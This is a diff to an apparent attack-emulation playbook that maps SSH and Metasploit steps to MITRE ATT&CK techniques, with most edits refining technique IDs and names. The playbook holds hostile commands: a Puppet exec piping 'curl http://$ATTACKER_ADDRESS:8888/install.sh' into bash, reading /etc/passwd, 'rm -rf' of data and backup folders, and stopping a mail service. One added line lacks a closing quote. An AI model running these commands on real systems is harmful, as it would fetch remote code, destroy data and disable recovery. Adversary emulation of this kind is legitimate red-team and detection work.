@@ -24,7 +24,7 @@ commands:
     port: 10022
     cmd: id
     metadata:
-      techniques: "T1078.002"
+      techniques: "T1078.003"
       tactics: "Initial Access"
       technique_name: "Valid Accounts: Local Accounts"
 
@@ -35,6 +35,7 @@ commands:
     metadata:
       techniques: "T1040"
       tactics: "Credential Access"
+      technique_name: "Network Sniffing"
 
   - type: sleep
     seconds: 20
@@ -122,10 +123,6 @@ commands:
     background: True
     kill_on_exit: true
 
-#  - type: ssh
-#    cmd: "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash"
-#    background: True
-#
 # LATERAL MOVEMENT
 
   - type: ssh
@@ -151,9 +148,9 @@ commands:
     cmd: "class blah2 {\nexec { 'curl http://$ATTACKER_ADDRESS:8888/install.sh | bash':\n   path => ['/usr/bin','/bin']\n}\n}\n\n"
     interactive: True
     metadata:
-      techniques: "T1072"
+      techniques: "T1072,T1105,T1059.004"
       tactics: "Execution, Lateral Movement"
-      technique_name: "Software Deployment Tools"
+      technique_name: "Software Deployment Tools,Ingress Tool Transfer,Command and Scripting Interpreter: Unix Shell"
 
   - type: ssh
     session: foothold
@@ -224,8 +221,9 @@ commands:
     session: movement
     cmd: cat /etc/passwd
     metadata:
-      techniques: "T1087"
+      techniques: "T1087.001"
       tactics: "Discovery"
+      technique_name: "Account Discovery: Local Account"
   
   - type: msf-session
     session: movement
@@ -233,25 +231,29 @@ commands:
     metadata:
       techniques: "T1531"
       tactics: "Impact"
+      technique_name: "Account Access Removal"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /media/data/*
     metadata:
-     techniques: "T1485"
-     tactics: "Impact"
+      techniques: "T1485"
+      tactics: "Impact
+      technique_name: "Data Destruction"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /var/backups/*
     metadata:
-     techniques: "T1490"
-     tactics: "Impact"
+      techniques: "T1490"
+      tactics: "Impact"
+      technique_name: "Inhibit System Recovery"
 
   - type: msf-session
     session: movement
     cmd: systemctl stop exim4.service
     metadata:
-     techniques: "T1489"
-     tactics: "Impact"
+      techniques: "T1489"
+      tactics: "Impact"
+      technique_name: "Service Stop"
 
